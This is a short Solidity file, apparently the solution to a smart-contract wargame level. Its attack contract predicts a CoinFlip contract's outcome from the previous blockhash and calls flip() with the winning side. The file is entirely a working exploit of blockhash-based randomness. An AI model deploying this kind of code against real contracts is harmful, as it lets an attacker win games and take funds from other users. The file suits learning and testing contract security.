import { CoinFlip } from "./coinFlip.sol";
pragma solidity ^0.6.0;

contract CoinFlipAttack {
    CoinFlip public coinFlipContract = CoinFlip(0xea50237f8b533B13eb30340c1E09cCc9bc4db99B);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attackFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue/FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinFlipContract.flip(side);
    }

}